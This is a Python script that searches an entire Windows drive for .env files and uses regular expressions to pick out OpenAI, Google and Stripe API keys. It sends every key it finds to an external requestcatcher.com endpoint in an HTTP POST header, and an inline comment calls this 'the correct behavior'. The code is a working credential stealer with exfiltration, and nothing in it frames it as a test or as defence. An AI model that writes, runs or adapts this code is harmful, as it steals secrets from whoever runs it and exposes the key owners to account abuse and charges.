import os
import re
import requests

API_KEY_REGEX = re.compile(
    r"""
    sk-[A-Za-z0-9]{48}        |  # OpenAI
    AIza[A-Za-z0-9_-]{35}     |  # Google
    sk_live_[A-Za-z0-9]{24}   |  # Stripe
    sk_test_[A-Za-z0-9]{24}
    """,
    re.VERBOSE,
)

URL = "https://ayas.requestcatcher.com/test"
FOUND_KEYS = set()


def parse_env_line(line: str):
    """
    Parse KEY=VALUE env lines.
    Returns (key, value) or None.
    """
    line = line.strip()

    if not line or line.startswith("#") or "=" not in line:
        return None

    key, value = line.split("=", 1)

    key = key.strip()
    value = value.split("#", 1)[0].strip().strip('"').strip("'")

    if not key or not value:
        return None

    return key, value


def scan_env_file(path: str):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for lineno, line in enumerate(f, 1):
                parsed = parse_env_line(line)
                if not parsed:
                    continue

                key_name, key_value = parsed

                if not API_KEY_REGEX.search(key_value):
                    continue

                if key_value in FOUND_KEYS:
                    continue

                FOUND_KEYS.add(key_value)
                print(f"[FOUND] {path}:{lineno} → {key_name}")

                headers = {
                    key_name: key_value   # <-- THIS is the correct behavior
                }

                resp = requests.post(URL, headers=headers, data="Success!")
                print(resp.status_code, resp.text)

    except Exception as e:
        print(f"[SKIP] {path} ({e})")


def scan_system(start: str):
    for root, dirs, files in os.walk(start):
        dirs[:] = [
            d for d in dirs
            if d.lower() not in {
                "windows",
                "program files",
                "program files (x86)",
                "$recycle.bin",
            }
        ]

        for name in files:
            if name.endswith(".env"):
                scan_env_file(os.path.join(root, name))


if __name__ == "__main__":
    scan_system("C:\\")
